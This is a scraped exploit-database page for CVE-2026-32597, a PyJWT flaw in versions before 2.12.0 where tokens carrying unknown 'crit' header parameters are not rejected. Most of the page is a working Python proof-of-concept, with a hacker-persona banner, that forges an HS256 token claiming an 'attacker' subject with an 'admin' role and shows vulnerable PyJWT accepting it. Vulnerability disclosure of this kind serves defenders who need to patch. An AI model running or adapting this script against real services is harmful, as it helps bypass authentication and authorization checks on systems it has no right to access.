---
title: PyJWT <  2.12.0 crit header bypass / Insufficient crit validation
url: https://cxsecurity.com/issue/WLB-2026030017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-14
fetch_date: 2026-03-15T04:24:19.319730
---

# PyJWT <  2.12.0 crit header bypass / Insufficient crit validation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PyJWT < 2.12.0 crit header bypass / Insufficient crit validation** **2026.03.14**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-32597](https://cxsecurity.com/cveshow/CVE-2026-32597/ "Click to see CVE-2026-32597")**  CWE: **[CWE-345 (Insufficient Verification of Data Authenticity), CWE-863 (Incorrect Authorization)](https://cxsecurity.com/cwe/CWE-345%20%28Insufficient%20Verification%20of%20Data%20Authenticity%29%2C%20CWE-863%20%28Incorrect%20Authorization%29 "Click to see CWE-345 (Insufficient Verification of Data Authenticity), CWE-863 (Incorrect Authorization)")** | |

#!/usr/bin/env python3
# Exploit Title: PyJWT < 2.12.0 crit header bypass / Insufficient crit validation
# CVE: CVE-2026-32597
# Date: 2026-03
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://github.com/jpadilla/pyjwt
# Software Link: https://pypi.org/project/PyJWT/
# Affected: PyJWT < 2.12.0
# Tested on:
# Category: Authentication Bypass
# Platform: Python
# Exploit Type: Proof of Concept
# CVSS: 7.5
# CWE : CWE-345, CWE-863
# Description: PyJWT does not reject JWTs containing unknown critical header parameters (crit)
# Fixed in: PyJWT 2.12.0
# Usage:
# python3 exploit.py
#
# Examples:
# python3 exploit.py
#
# Notes: Demonstrates acceptance of token with unknown critical extension
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-32597 • PyJWT crit header bypass ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import jwt
import hmac
import hashlib
import base64
import json
def b64url\_encode(data):
if isinstance(data, str):
data = data.encode('utf-8')
encoded = base64.urlsafe\_b64encode(data).rstrip(b'=')
return encoded.decode('utf-8')
header = {
"alg": "HS256",
"crit": ["x-custom-policy"],
"x-custom-policy": "require-mfa-and-binding"
}
payload = {
"sub": "attacker",
"role": "admin",
"exp": 9999999999
}
secret = b"secret-key"
header\_str = json.dumps(header, separators=(',', ':'))
payload\_str = json.dumps(payload, separators=(',', ':'))
h = b64url\_encode(header\_str)
p = b64url\_encode(payload\_str)
signing\_input = f"{h}.{p}".encode('utf-8')
signature = hmac.new(secret, signing\_input, hashlib.sha256).digest()
sig = b64url\_encode(signature)
malicious\_token = f"{h}.{p}.{sig}"
print("Generated malicious token:")
print(malicious\_token)
print("\n")
print("Decoding with PyJWT (vulnerable versions accept this token):")
try:
decoded = jwt.decode(
malicious\_token,
secret,
algorithms=["HS256"],
options={"verify\_signature": True}
)
print("TOKEN ACCEPTED (vulnerable behavior):")
print(decoded)
except jwt.exceptions.InvalidTokenError as e:
print("TOKEN REJECTED (correct / patched behavior):")
print(e)
except Exception as e:
print("Unexpected error:")
print(e)

**##### References:**

https://github.com/jpadilla/pyjwt/security/advisories/GHSA-752w-5fwx-jx9f

https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.11

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030017)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top